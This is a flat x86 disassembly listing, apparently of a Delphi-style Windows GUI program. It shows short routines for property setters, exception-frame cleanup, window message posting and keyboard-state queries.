sub_459d14
retn
sub_459d18
retn
sub_459d1c
retn
sub_459d20
retn
sub_459d24
retn
sub_459d28
retn
sub_459fd4
jmp sub_4038f0
sub_45a370
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebx + 0x90 ] eax
sub_45a398
push esi
mov si 0xffef
call sub_403370
pop esi
retn
sub_45a439
jmp sub_4038f0
sub_45a440
pop ebp
retn
sub_45a444
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417928
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417928
sub_45a5e4
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_45a7bd
jmp sub_4038f0
sub_45a7c4
pop ebx
pop ecx
pop ebp
retn
sub_45a7c8
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_45a7d0
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_45a9a0
sub_45a87d
jmp sub_4038f0
sub_45a884
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403174
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_45aa33
jmp sub_4038f0
sub_45aa3a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45aad2
jmp sub_4038f0
sub_45aad9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45aaf6
mov eax [ ebp - 0xc ]
call sub_403174
retn
sub_45aaef
jmp sub_4038f0
sub_45aaf6
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403370
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45abaf
jmp sub_4038f0
sub_45abb6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45abbc
or edx 0xffffffff
call sub_45ab30
retn
sub_45afcb
jmp sub_4038f0
sub_45afd2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45afef
mov eax [ ebp - 0xc ]
call sub_403174
retn
sub_45afe8
jmp sub_4038f0
sub_45afef
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b00c
mov eax [ ebp - 0x4 ]
call sub_45bb04
retn
sub_45b005
jmp sub_4038f0
sub_45b00c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b210
jmp sub_4038f0
sub_45b217
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b21c
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403370
sub_45b234
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_416c28
pop ebx
retn
sub_45b2d8
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_41814c
sub_45b3ef
jmp sub_4038f0
sub_45b3f6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403174
retn
sub_45b40c
jmp sub_4038f0
sub_45b71e
jmp sub_4038f0
sub_45b725
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b742
mov eax [ ebp - 0x10 ]
call sub_403174
retn
sub_45b73b
jmp sub_4038f0
sub_45b742
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b75f
mov eax [ ebp - 0x8 ]
call sub_403174
retn
sub_45b758
jmp sub_4038f0
sub_45b75f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b7c8
jmp sub_4038f0
sub_45b8e1
jmp sub_4038f0
sub_45b8fe
jmp sub_4038f0
sub_45bab6
jmp sub_4038f0
sub_45babd
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45bb00
inc [ eax + 0x5c ]
retn
sub_45bb04
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403370
sub_45bb58
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_45bb95
jmp sub_4038f0
sub_45bb9c
pop ebp
retn
sub_45bba0
sub [ rw-data ] 0x1
retn
sub_45bfec
clc
push edx
push ecx
dec esp
cli
inc ebp
add ah cl
hlt
sub_45caab
jmp [ eax + eax ]
sub_45cb08
mov eax [ esp + 0x8 ]
retn
sub_45cb10
push ebx
mov ebx eax
call sub_45cb08
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
jmp sub_403928
sub_45cb2c
pop ebx
retn
sub_45cda5
jmp sub_4038f0
sub_45cdac
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45cef7
jmp sub_4038f0
sub_45cefe
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45cf14
push ebx
mov eax [ rw-data ]
call sub_418acc
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_418aa0
mov eax ebx
pop ebx
retn
sub_45d09c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_45d0b8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_45d7b3
jmp sub_4038f0
sub_45d7ba
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d8b2
jmp sub_4038f0
sub_45d8b9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45dcdc
jmp sub_4038f0
sub_45dce3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_45e18f
jmp sub_4038f0
sub_45e630
jmp sub_4038f0
sub_45e637
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ea9b
jmp sub_4038f0
sub_45ef58
jmp sub_4038f0
sub_45ef5f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45f30a
jmp sub_4038f0
sub_45f311
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45f31f
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45f4cc
mov eax [ r-xdata ]
retn
sub_45f508
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45f51c
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45f52c
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45f53c
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_45f838
mov edx eax
sub_45f5d4
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
mov edx esi
call sub_45f554
pop esi
pop ebx
retn
sub_45f650
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_45f838
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_418304
mov ecx eax
sub_45fa28
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_45fa90
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_45fe38
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_45fe6c
sub_45fe6c
mov edx sub_45fe44
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_45cf94
retn
sub_460056
jmp sub_4038f0
sub_46005d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4604f4
jmp sub_4038f0
sub_460533
jmp sub_4038f0
sub_46053a
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4606d8
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_460814
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403370
pop esi
pop ebp
retn 0x8
sub_460830
mov eax [ eax + 0x34 ]
call sub_45da68
retn
sub_46083c
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403370
pop esi
retn
sub_460878
push ebx
mov ecx sub_460850
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_45cf94
pop ebx
retn
sub_460aac
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_460ac0
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_460bf5
jmp sub_40363c
sub_460cf7
jmp sub_4038f0
sub_460d22
jmp sub_4038f0
sub_460d29
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_460d40
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_460f28
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_460878
sub_460fa8
jmp sub_4038f0
sub_460fec
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_461004
push ebx
mov ebx eax
mov eax ebx
call sub_420e18
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_461056
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_460878
sub_4610cc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_461215
jmp sub_4038f0
sub_46121c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46145c
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_46146c
sub_4614c0
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_4614d0
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_4614e0
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_4614f0
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_461500
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_461578
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_45d8c0
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_45d8c0
retn
sub_461594
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_45d8c0
sub_4615dc
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_460830
retn
mov eax edx
retn
j_sub_40363c#9
jmp sub_40363c
sub_46161b
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46dc5c
call sub_4039a4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_461981
jmp sub_4038f0
sub_461988
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403174
retn
sub_46199e
jmp sub_4038f0
sub_461a9f
jmp sub_4038f0
sub_461aa6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461ac3
mov eax [ ebp - 0x14 ]
call sub_403174
retn
sub_461abc
jmp sub_4038f0
sub_461ae1
jmp sub_4038f0
sub_461b6b
jmp sub_4038f0
sub_461b72
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461ba4
push ebx
mov ebx eax
mov eax ebx
call sub_418444
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_421bc8
sub_461c68
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_461c7c
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_461c84
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_462049
jmp sub_4038f0
sub_462050
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_462150
jmp sub_4038f0
sub_462157
pop ebp
retn
sub_4648dc
mov eax [ rw-data ]
retn
sub_4648e4
mov [ rw-data ] eax
retn
j_sub_40363c#8
jmp sub_40363c
sub_464a63
jmp sub_4038f0
sub_464a6a
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464c38
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_421a58
pop ebp
retn 0x8
sub_464c4c
call sub_421af0
retn
sub_464d30
push ebx
add esp 0xffffff00
push esp
call GetKeyboardState
mov eax esp
call sub_464ce4
mov ebx eax
mov eax ebx
add esp 0x100
pop ebx
retn
sub_464dae
jmp sub_4038f0
sub_464db5
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_464e59
jmp sub_4038f0
sub_464e60
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464ef0
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_46561c
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_465cc8
sub_465638
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_46561c
sub_465758
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_465cc8
sub_465770
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_465cc8
sub_465788
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_465cc8
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_4657b4
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_4657c0
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_465cc8
retn
sub_465aa0
push ebx
mov ebx edx
mov edx ebx
call sub_450ca8
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_465b10
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_465c38
jmp sub_4038f0
sub_465c3f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465c48
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_465054
mov eax [ ebx + 0x20c ]
call sub_465054
sub_465ca8
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_465cb8
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_465db3
jmp sub_4038f0
sub_465dc0
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_465dd8
sub_465ff4
retn
sub_466062
jmp sub_4038f0
sub_4660a1
jmp sub_4038f0
sub_4660d4
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_4521a0
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_4652e0
retn
sub_4660f8
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_4521c0
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_4652e0
retn
sub_4661ed
jmp sub_4038f0
sub_4661f4
mov eax [ ebp - 0x4 ]
call sub_454120
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_464f48
mov eax [ ebp - 0x4 ]
call sub_465cc8
sub_4662cc
cmp dl [ eax + 0x220 ]
je r-xdata
retn
mov [ eax + 0x220 ] dl
call sub_4513bc
sub_4662e0
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_466420
jmp sub_4038f0
sub_466458
jmp sub_4038f0
sub_46645f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46647f
lea eax [ ebp - 0x114 ]
call sub_403eec
retn
sub_466478
jmp sub_4038f0
sub_46647f
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_466786
jmp sub_4038f0
sub_46678d
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403510
sub_4667e1
jmp sub_40363c
j_sub_40363c#7
jmp sub_40363c
sub_466862
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46dc5c
call sub_4039a4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_466c1a
jmp sub_4038f0
sub_466c21
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_466cfc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41cc54
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_466d14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_466d4c
mov edx eax
mov eax esi
call sub_41ee44
pop esi
pop ebx
retn
sub_466d30
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4680f0
mov edx eax
mov eax esi
call sub_41ee44
pop esi
pop ebx
retn
sub_466d4c
push ebx
mov ebx eax
mov eax ebx
call sub_467d90
mov edx r-xdata
call sub_4248ec
pop ebx
retn
sub_466e50
push ebx
mov ebx eax
mov eax ebx
call sub_466e60
xor al 0x1
pop ebx
retn
sub_466e60
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_466ebc
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_466edc
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_466efc
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_4671f5
jmp sub_4038f0
sub_4671fc
pop ecx
pop ebp
retn
sub_467200
xor eax eax
retn
sub_4674d8
jmp sub_4038f0
sub_4674df
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403174
retn
sub_4674f5
jmp sub_4038f0
sub_4675df
jmp sub_4038f0
sub_4675e6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467603
mov eax [ ebp - 0xc ]
call sub_403174
retn
sub_4675fc
jmp sub_4038f0
sub_467623
jmp sub_4038f0
sub_46790e
jmp sub_4038f0
sub_467aa1
jmp sub_4038f0
sub_467d90
mov eax [ eax + 0x238 ]
retn
sub_467d98
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_467da4
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_4680e2
jmp sub_4038f0
sub_4680e9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4680f0
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_468138
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_4513bc
sub_468154
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_468190
push ebx
mov ebx eax
mov eax ebx
call sub_453350
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_424210
sub_468214
push ebx
mov ebx eax
mov eax ebx
call sub_453378
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_424990
sub_468234
push ebx
mov ebx eax
mov eax ebx
call sub_467e54
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_467f1c
pop ebx
retn
sub_468a61
lea eax [ ebp - 0xb4 ]
call sub_403eec
retn
sub_468a6d
jmp sub_4038f0
j_sub_468a61
jmp sub_468a61
sub_468a74
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_468bcc
jmp sub_4038f0
sub_468bd3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4038f0#9
jmp sub_4038f0
sub_468ebf
mov eax [ rw-data ]
call sub_46b770
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468ed6
add [ eax ] al
retn
sub_469134
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_469154
mov eax [ eax + 0x240 ]
call sub_428b34
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_46d510
j_sub_4038f0#8
jmp sub_4038f0
sub_469202
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469225
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_424968
retn
j_sub_4038f0#7
jmp sub_4038f0
sub_469225
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4693e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_469154
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_46964c
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_4609e4
sub_469737
jmp sub_4038f0
sub_46973e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_469744
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_468f2c
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_46979c
call sub_46a4c4
retn
sub_469be9
jmp sub_4038f0
sub_469bf0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_40363c#6
jmp sub_40363c
j_sub_40363c#5
jmp sub_40363c
sub_46a381
jmp sub_4038f0
sub_46a388
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a3a5
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
sub_46a39e
jmp sub_4038f0
sub_46a3a5
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46a3ac
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_428b34
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_466df4
sub_46a3cc
call sub_403174
retn
sub_46a424
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
j_sub_4038f0#6
jmp sub_4038f0
j_sub_40363c#4
jmp sub_40363c
sub_46a664
xor edx edx
call sub_467158
retn
sub_46a66c
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_467158
mov eax ebx
call sub_44d894
pop ebx
retn
sub_46a6f2
jmp sub_4038f0
sub_46a6f9
pop ebx
pop ecx
pop ebp
retn
sub_46a700
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_453e1c
push eax
call PostMessageA
pop ebx
retn
sub_46a904
jmp sub_4038f0
j_sub_4038f0#5
jmp sub_4038f0
sub_46a9af
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a9ce
mov eax [ rw-data ]
call sub_46cbe8
retn
sub_46a9c7
jmp sub_4038f0
sub_46a9ce
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a9eb
lea eax [ ebp - 0x20 ]
call sub_403eec
retn
sub_46a9e4
jmp sub_4038f0
sub_46a9eb
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46aacc
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_44ca40
retn
mov edx eax
mov eax [ rw-data ]
call sub_46c23c
retn
sub_46ae50
mov edx eax
mov eax [ rw-data ]
call sub_46dc5c
mov al 0x1
retn
sub_46af38
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_46ae60
sub_46af4c
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_46ae60
sub_46af60
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_46ae60
sub_46af74
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_46ae60
sub_46af88
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_46b0f3
jmp sub_4038f0
sub_46b0fa
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b100
push ebx
mov ebx eax
mov eax ebx
call sub_452734
mov eax ebx
call sub_4528b8
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_46a700
sub_46b376
jmp sub_4038f0
sub_46b37d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46b384
push ebx
mov ebx edx
mov edx ebx
call sub_452b9c
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_44cb48
pop ebx
retn
sub_46b3d8
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46b440
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_46b3f0
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46b440
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_46b40c
push ebx
add esp 0xfffffff0
